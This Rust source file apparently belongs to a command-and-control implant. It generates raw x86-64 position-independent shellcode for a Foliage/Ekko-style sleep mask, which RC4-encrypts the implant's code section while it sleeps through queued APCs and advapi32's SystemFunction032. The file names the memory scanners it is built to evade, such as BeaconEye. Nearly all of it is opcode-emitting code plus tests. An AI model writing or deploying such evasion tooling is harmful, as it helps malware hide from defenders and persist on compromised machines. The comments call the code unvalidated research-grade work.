//! Position-independent stack thunk builder for the Foliage sleep mask.
//!
//! ## The problem (P4)
//!
//! [`crate::sleep::foliage_helper`] encrypts `.text` (the implant's code
//! section) during sleep so Hunt-Sleeping-Beacons / BeaconEye / memory scanners
//! see ciphertext, not the beacon's code. But the helper's OWN code lives in
//! `.text` — so the moment it flips `.text` to ciphertext, its next instruction
//! fetch crashes (executing encrypted bytes). This is why the APC path is
//! commented out in `sleep.rs:222-225` today.
//!
//! ## The fix (Ekko / Foliage class)
//!
//! Write a tiny position-independent machine-code thunk onto the **stack**
//! (or a fresh RWX page), then queue it via `NtQueueApcThread(beacon_tid,
//! thunk_addr, ...)`. The thunk runs on the beacon thread's alertable wait
//! stack and executes: `NtProtectVirtualMemory(.text, RX→RW)` → RC4-mask
//! `.text` → `NtWaitForSingleObject` → RC4-unmask → `NtProtectVirtualMemory
//! (.text, RW→RX)`. Because the thunk executes from the **stack** (not
//! `.text`), encrypting `.text` doesn't corrupt the in-flight instructions.
//!
//! ## Research-grade honesty
//!
//! Authoring correct x86-64 PIC shellcode that survives a real Windows APC
//! dispatch (which clobbers specific registers, requires a 32-byte shadow
//! space, 16-byte stack alignment at the call, and a valid CONTEXT) needs
//! real-machine iteration. The thunk builder below emits the full byte
//! sequence per the Ekko/Foliage technique, but is gated behind
//! `FOLIAGE_APC_ENABLED` (default OFF). The operator flips it on with
//! `NYX_FOLIAGE_APC_ON=1` at build time after verifying on the target.
//!
//! The APC orchestration (`execute_foliage_apc`) is already written and
//! tested for the data-only floor; this module supplies the one missing piece
//! — the PIC thunk — so the APC path can run without corrupting `.text`.

#![cfg(target_os = "windows")]

/// A built PIC thunk ready to be queued as an APC routine. The `bytes` are
/// position-independent x86-64 machine code that performs the
/// mask→wait→unmask sequence. `code_addr` is the address the APC will jump to
/// (the start of `bytes` once it's placed in executable memory).
#[repr(C)]
pub struct PicThunk {
    /// The thunk's machine-code bytes. Lives in a stack-allocated buffer in
    /// `execute_foliage_apc` (or a short-lived RWX page). The lifetime ties to
    /// the helper thread's join.
    pub bytes: [u8; THUNK_MAX_LEN],
    /// Active length of `bytes`.
    pub len: usize,
    /// Address of the executable copy (the helper resolves this after copying
    /// `bytes` to its final executable location).
    pub code_addr: usize,
}

/// Maximum size of any thunk we build (the mask→wait→unmask sequence is
/// ~120-180 bytes; this is generous headroom).
pub const THUNK_MAX_LEN: usize = 256;

/// Inputs to the thunk builder. All addresses must be resolved on the beacon
/// thread BEFORE the helper spawns (per the single-trampoline rule in
/// `sleep.rs:249-257`). The thunk receives these via a leaked `PicThunkParams`
/// block whose address it reads from a register at entry.
#[repr(C)]
pub struct PicThunkParams {
    /// `NtProtectVirtualMemory` fn pointer (raw export).
    pub nt_protect_virtual_memory: usize,
    /// `NtWaitForSingleObject` fn pointer (raw export).
    pub nt_wait_for_single_object: usize,
    /// `-1` (INVALID_HANDLE_VALUE) as a usize — passed to NtWaitForSingleObject
    /// to get a UserRequest wait-reason (matches the beacon's normal sleep).
    pub invalid_handle: usize,
    /// Address of the RC4 mask/unmask routine (PIC-safe; operates on a slice).
    /// The thunk calls this twice (mask then unmask). Signature:
    ///   `unsafe extern "system" fn(key: *const u8, key_len: usize, buf: *mut u8, len: usize)`
    /// When the thunk is wired, this points to a small PIC wrapper on the RWX
    /// page that builds USTRINGs and calls `advapi32!SystemFunction032` — the
    /// RC4 runs from a system DLL, not from our .text, so encrypting .text
    /// doesn't corrupt the RC4 code.
    pub rc4_mask: usize,
    /// Base of `.text` to mask.
    pub text_base: usize,
    /// Length of `.text`.
    pub text_len: usize,
    /// RC4 key pointer (16 bytes).
    pub key: [u8; 16],
    /// Sleep duration in 100ns units (negative = relative).
    pub delay_100ns: i64,
    /// Result flag: 0 = not yet run, 1 = thunk completed successfully,
    /// 2 = thunk ran but a step failed.
    pub status: core::sync::atomic::AtomicU32,
}

// Offsets into PicThunkParams (must match the struct field order). We assert
const OFF_PROTECT: u8 = 0x00;
const OFF_WAIT: u8 = 0x08;
const OFF_INVAL: u8 = 0x10;
const OFF_RC4: u8 = 0x18;
const OFF_TEXT_BASE: u8 = 0x20;
const OFF_TEXT_LEN: u8 = 0x28;
const OFF_KEY: u8 = 0x30;
const OFF_DELAY: u8 = 0x40;
const OFF_STATUS: u8 = 0x48;
/// The thunk's `NtProtectVirtualMemory` fifth arg needs a scratch slot to
/// write the old protection. We append it after `status` in the leaked block
/// (the Rust struct is followed by 4 bytes of scratch when allocated).
const OFF_OLD_SCRATCH: u8 = 0x50;

/// Build the PIC thunk. The generated code does (pseudo-Rust):
///
/// ```ignore
/// // rcx = PicThunkParams* (Windows x64 calling convention, arg0)
/// // r11 = params pointer (saved across calls; callee-saved in MS ABI)
/// mov r11, rcx
///
/// // 1. NtProtectVirtualMemory(self=-1, &text_base, &text_len, RW=0x04, &old)
/// // 2. rc4_mask(key, 16, text_base, text_len)        // encrypt .text
/// // 3. NtWaitForSingleObject(INVALID_HANDLE, FALSE, &delay)
/// // 4. rc4_mask(key, 16, text_base, text_len)        // decrypt (RC4 symmetric)
/// // 5. NtProtectVirtualMemory(self=-1, &text_base, &text_len, RX=0x10, &old)
/// // 6. status = 1 (success)
/// // 7. ret
/// ```
///
/// Returns a `PicThunk` whose `bytes` hold the generated opcodes. The caller
/// copies these to an executable location and records `code_addr`.
///
/// # ⚠ Research-grade
/// The opcode sequence below encodes the documented Ekko/Foliage pattern but
/// has NOT been validated on a real Windows target in this codebase. Off-by-
/// one in shadow-space sizing, stack alignment at the `call`, or the
/// `lea`/`mov` addressing forms will crash on first run. The operator MUST
/// verify on the target before relying on this. Gate is `FOLIAGE_APC_ENABLED`
/// (default OFF).
pub fn build_mask_thunk() -> PicThunk {
    let mut bytes = [0u8; THUNK_MAX_LEN];
    let mut len = 0usize;

    // Helper closures to push bytes.
    macro_rules! push {
        ($b:expr) => {{
            bytes[len] = $b;
            len += 1;
        }};
    }
    macro_rules! push_u32 {
        ($v:expr) => {{
            let v: u32 = $v;
            bytes[len..len + 4].copy_from_slice(&v.to_le_bytes());
            len += 4;
        }};
    }

    // ---- prologue: save params pointer into r11 (callee-saved in MS ABI) ----
    // mov r11, rcx
    push!(0x49);
    push!(0x89);
    push!(0xcb);

    // ---- step 1: NtProtectVirtualMemory(self=-1, &base, &len, RW=0x04, &old) ----
    // Windows x64 ABI: rcx, rdx, r8, r9, then stack; 32-byte shadow space + align.
    // rcx = INVALID_HANDLE_VALUE (NtCurrentProcess pseudo-handle = (HANDLE)-1).
    //   mov rcx, [r11 + OFF_INVAL]
    push!(0x49);
    push!(0x8b);
    push!(0x4b);
    push!(OFF_INVAL);
    // rdx = &text_base. lea rdx, [r11 + OFF_TEXT_BASE]
    push!(0x48);
    push!(0x8d);
    push!(0x53);
    push!(OFF_TEXT_BASE);
    // r8 = &text_len.  lea r8, [r11 + OFF_TEXT_LEN]
    push!(0x4c);
    push!(0x8d);
    push!(0x43);
    push!(OFF_TEXT_LEN);
    // r9 = 0x04 (PAGE_READWRITE).  mov r9d, 4
    push!(0x41);
    push!(0xb9);
    push_u32!(0x04);
    // stack[0x20] = &old_scratch.  lea rax, [r11 + OFF_OLD_SCRATCH]; mov [rsp+0x20], rax
    push!(0x49);
    push!(0x8d);
    push!(0x43);
    push!(OFF_OLD_SCRATCH);
    push!(0x48);
    push!(0x89);
    push!(0x44);
    push!(0x24);
    push!(0x20);
    // sub rsp, 0x28 (shadow 0x20 + 8 align)
    push!(0x48);
    push!(0x83);
    push!(0xec);
    push!(0x28);
    // call protect: mov rax, [r11+OFF_PROTECT]; call rax
    push!(0x49);
    push!(0x8b);
    push!(0x43);
    push!(OFF_PROTECT);
    push!(0xff);
    push!(0xd0);
    // add rsp, 0x28
    push!(0x48);
    push!(0x83);
    push!(0xc4);
    push!(0x28);

    // ---- step 2: rc4_mask(key, 16, text_base, text_len) ----
    // rcx = &key.  lea rcx, [r11 + OFF_KEY]
    push!(0x48);
    push!(0x8d);
    push!(0x4b);
    push!(OFF_KEY);
    // rdx = 16.  mov edx, 16
    push!(0xba);
    push_u32!(16);
    // r8 = text_base (value).  mov r8, [r11 + OFF_TEXT_BASE]
    push!(0x4c);
    push!(0x8b);
    push!(0x43);
    push!(OFF_TEXT_BASE);
    // r9 = text_len (value).  mov r9, [r11 + OFF_TEXT_LEN]
    push!(0x4c);
    push!(0x8b);
    push!(0x4b);
    push!(OFF_TEXT_LEN);
    // sub rsp, 0x20 (shadow only, no stack arg)
    push!(0x48);
    push!(0x83);
    push!(0xec);
    push!(0x20);
    // call rc4: mov rax, [r11+OFF_RC4]; call rax
    push!(0x49);
    push!(0x8b);
    push!(0x43);
    push!(OFF_RC4);
    push!(0xff);
    push!(0xd0);
    // add rsp, 0x20
    push!(0x48);
    push!(0x83);
    push!(0xc4);
    push!(0x20);

    // ---- step 3: NtWaitForSingleObject(INVALID_HANDLE, FALSE=0, &delay) ----
    // rcx = [r11 + OFF_INVAL]
    push!(0x49);
    push!(0x8b);
    push!(0x4b);
    push!(OFF_INVAL);
    // rdx = 0 (Alertable FALSE). xor edx, edx
    push!(0x31);
    push!(0xd2);
    // r8 = &delay.  lea r8, [r11 + OFF_DELAY]
    push!(0x4c);
    push!(0x8d);
    push!(0x43);
    push!(OFF_DELAY);
    // sub rsp, 0x20
    push!(0x48);
    push!(0x83);
    push!(0xec);
    push!(0x20);
    // call wait: mov rax, [r11+OFF_WAIT]; call rax
    push!(0x49);
    push!(0x8b);
    push!(0x43);
    push!(OFF_WAIT);
    push!(0xff);
    push!(0xd0);
    // add rsp, 0x20
    push!(0x48);
    push!(0x83);
    push!(0xc4);
    push!(0x20);

    // ---- step 4: rc4_mask(key, 16, text_base, text_len) — unmask ----
    // (identical to step 2 — RC4 is symmetric; re-masking unmasks)
    push!(0x48);
    push!(0x8d);
    push!(0x4b);
    push!(OFF_KEY);
    push!(0xba);
    push_u32!(16);
    push!(0x4c);
    push!(0x8b);
    push!(0x43);
    push!(OFF_TEXT_BASE);
    push!(0x4c);
    push!(0x8b);
    push!(0x4b);
    push!(OFF_TEXT_LEN);
    push!(0x48);
    push!(0x83);
    push!(0xec);
    push!(0x20);
    // call rc4 (unmask): mov rax, [r11+OFF_RC4]; call rax
    push!(0x49);
    push!(0x8b);
    push!(0x43);
    push!(OFF_RC4);
    push!(0xff);
    push!(0xd0);
    push!(0x48);
    push!(0x83);
    push!(0xc4);
    push!(0x20);

    // ---- step 5: NtProtectVirtualMemory(self=-1, &base, &len, RX=0x10, &old) ----
    // (identical to step 1 but r9 = 0x10 PAGE_EXECUTE_READ)
    push!(0x49);
    push!(0x8b);
    push!(0x4b);
    push!(OFF_INVAL);
    push!(0x48);
    push!(0x8d);
    push!(0x53);
    push!(OFF_TEXT_BASE);
    push!(0x4c);
    push!(0x8d);
    push!(0x43);
    push!(OFF_TEXT_LEN);
    // r9 = 0x10 (PAGE_EXECUTE_READ).  mov r9d, 0x10
    push!(0x41);
    push!(0xb9);
    push_u32!(0x10);
    // stack[0x20] = &old_scratch (reuse the same scratch slot)
    push!(0x49);
    push!(0x8d);
    push!(0x43);
    push!(OFF_OLD_SCRATCH);
    push!(0x48);
    push!(0x89);
    push!(0x44);
    push!(0x24);
    push!(0x20);
    push!(0x48);
    push!(0x83);
    push!(0xec);
    push!(0x28);
    // call protect: mov rax, [r11+OFF_PROTECT]; call rax
    push!(0x49);
    push!(0x8b);
    push!(0x43);
    push!(OFF_PROTECT);
    push!(0xff);
    push!(0xd0);
    push!(0x48);
    push!(0x83);
    push!(0xc4);
    push!(0x28);

    // ---- step 6: status = 1 (success) ----
    // mov dword ptr [r11 + OFF_STATUS], 1
    push!(0x41);
    push!(0xc7);
    push!(0x43);
    push!(OFF_STATUS);
    push_u32!(1);

    // ---- epilogue: ret ----
    push!(0xc3);

    PicThunk {
        bytes,
        len,
        code_addr: 0, // caller resolves after copying to executable memory
    }
}

// ============================================================================
// RC4 wrapper: calls advapi32!SystemFunction032 with USTRING args
// ============================================================================
// The PIC thunk needs an RC4 function that does NOT live in .text (otherwise
// encrypting .text corrupts it).  This builder emits a small position-independent
// trampoline that adapts the thunk's 4-arg calling convention to SystemFunction032's
// 2-USTRING convention.  The trampoline is intended to live on the same RWX page
// as the thunk, so it survives .text encryption.
///
/// Maximum size of the RC4 wrapper trampoline (generous, ~80 bytes in practice).
pub const RC4_WRAPPER_MAX_LEN: usize = 128;
///
/// Build a PIC trampoline that calls `advapi32!SystemFunction032`.  The trampoline
/// has the same 4-arg signature as `rc4_shim`:
///   `extern "system" fn(key: *const u8, key_len: usize, buf: *mut u8, len: usize)`
///
/// Internally it builds two `USTRING` structs on the stack (each 16 bytes: {Length,
/// MaximumLength, Buffer}) and calls `SystemFunction032(&key_ustring, &data_ustring)`.
///
/// `sf032_addr` is the absolute address of `advapi32!SystemFunction032`, resolved
/// once at thunk-wire time and embedded as an immediate in the generated code.
/// This is the ONLY non-PIC part of the trampoline — the advapi32 load address
/// doesn't change during the process lifetime, so the immediate remains valid.
pub fn build_rc4_sf032_wrapper(sf032_addr: usize) -> ([u8; RC4_WRAPPER_MAX_LEN], usize) {
    let mut bytes = [0u8; RC4_WRAPPER_MAX_LEN];
    let mut len = 0usize;
    let a = sf032_addr;

    // Helper closures
    macro_rules! push {
        ($b:expr) => {{
            bytes[len] = $b;
            len += 1;
        }};
    }

    // ---- Prologue: save rcx in a non-volatile register --------------------
    // We need to preserve the incoming args (rcx, rdx, r8, r9) while setting
    // up the SystemFunction032 call (rcx, rdx).  Store rcx (key_ptr) in r10.
    // mov r10, rcx
    push!(0x4c);
    push!(0x89);
    push!(0xd1);

    // ---- Allocate stack: 0x20 shadow + 0x20 (two USTRINGs) + 0x8 align ---
    // sub rsp, 0x48
    push!(0x48);
    push!(0x83);
    push!(0xec);
    push!(0x48);

    // ---- Build key_ustring at rsp+0x28 -----------------------------------
    // key_ustring.Length = key_len (rdx, truncated to 32 bits)
    // mov [rsp+0x28], edx
    push!(0x89);
    push!(0x54);
    push!(0x24);
    push!(0x28);
    // key_ustring.MaximumLength = key_len
    // mov [rsp+0x2C], edx
    push!(0x89);
    push!(0x54);
    push!(0x24);
    push!(0x2c);
    // key_ustring.Buffer = key_ptr (saved in r10)
    // mov [rsp+0x30], r10
    push!(0x4c);
    push!(0x89);
    push!(0x54);
    push!(0x24);
    push!(0x30);

    // ---- Build data_ustring at rsp+0x38 ----------------------------------
    // data_ustring.Length = buf_len (r9, truncated to 32 bits)
    // mov [rsp+0x38], r9d
    push!(0x44);
    push!(0x89);
    push!(0x4c);
    push!(0x24);
    push!(0x38);
    // data_ustring.MaximumLength = buf_len
    // mov [rsp+0x3C], r9d
    push!(0x44);
    push!(0x89);
    push!(0x4c);
    push!(0x24);
    push!(0x3c);
    // data_ustring.Buffer = buf_ptr (r8)
    // mov [rsp+0x40], r8
    push!(0x4c);
    push!(0x89);
    push!(0x44);
    push!(0x24);
    push!(0x40);

    // ---- Call SystemFunction032(&key_ustring, &data_ustring) --------------
    // rcx = &key_ustring (rsp+0x28)
    // lea rcx, [rsp+0x28]
    push!(0x48);
    push!(0x8d);
    push!(0x4c);
    push!(0x24);
    push!(0x28);
    // rdx = &data_ustring (rsp+0x38)
    // lea rdx, [rsp+0x38]
    push!(0x48);
    push!(0x8d);
    push!(0x54);
    push!(0x24);
    push!(0x38);
    // call [rip + <offset>] — we embed the absolute address right after the call
    // using a RIP-relative load.
    // mov rax, <sf032_addr>
    push!(0x48);
    push!(0xb8); // REX.W + MOV RAX, imm64
                 // Little-endian absolute address (8 bytes)
    let addr_bytes = a.to_le_bytes();
    for b in addr_bytes {
        push!(b);
    }
    // call rax
    push!(0xff);
    push!(0xd0);

    // ---- Epilogue: free stack + return -----------------------------------
    // add rsp, 0x48
    push!(0x48);
    push!(0x83);
    push!(0xc4);
    push!(0x48);
    // ret
    push!(0xc3);

    (bytes, len)
}
#[cfg(test)]
mod tests {
    use super::*;

    /// Sanity: the thunk builder produces a non-empty byte sequence within
    /// the buffer bounds and ends with a `ret` (0xC3).
    #[test]
    fn thunk_is_well_formed() {
        let t = build_mask_thunk();
        assert!(
            t.len > 50,
            "thunk should be substantial; got {} bytes",
            t.len
        );
        assert!(t.len <= THUNK_MAX_LEN, "thunk overran buffer");
        assert_eq!(t.bytes[t.len - 1], 0xC3, "thunk must end with ret");
    }

    /// The thunk must start with `mov r11, rcx` (49 89 CB) — the canonical
    /// prologue that saves the params pointer.
    #[test]
    fn thunk_prologue_is_mov_r11_rcx() {
        let t = build_mask_thunk();
        assert_eq!(&t.bytes[0..3], &[0x49, 0x89, 0xCB]);
    }

    /// The struct field offsets must match the OFF_* constants the thunk
    /// encodes — a struct reorder would silently break the addressing.
    #[test]
    fn fn_pointer_offsets_match_struct() {
        assert_eq!(
            core::mem::offset_of!(PicThunkParams, nt_protect_virtual_memory),
            OFF_PROTECT as usize
        );
        assert_eq!(
            core::mem::offset_of!(PicThunkParams, nt_wait_for_single_object),
            OFF_WAIT as usize
        );
        assert_eq!(
            core::mem::offset_of!(PicThunkParams, invalid_handle),
            OFF_INVAL as usize
        );
        assert_eq!(
            core::mem::offset_of!(PicThunkParams, rc4_mask),
            OFF_RC4 as usize
        );
        assert_eq!(
            core::mem::offset_of!(PicThunkParams, text_base),
            OFF_TEXT_BASE as usize
        );
        assert_eq!(
            core::mem::offset_of!(PicThunkParams, text_len),
            OFF_TEXT_LEN as usize
        );
        assert_eq!(core::mem::offset_of!(PicThunkParams, key), OFF_KEY as usize);
        assert_eq!(
            core::mem::offset_of!(PicThunkParams, delay_100ns),
            OFF_DELAY as usize
        );
        assert_eq!(
            core::mem::offset_of!(PicThunkParams, status),
            OFF_STATUS as usize
        );
    }
}
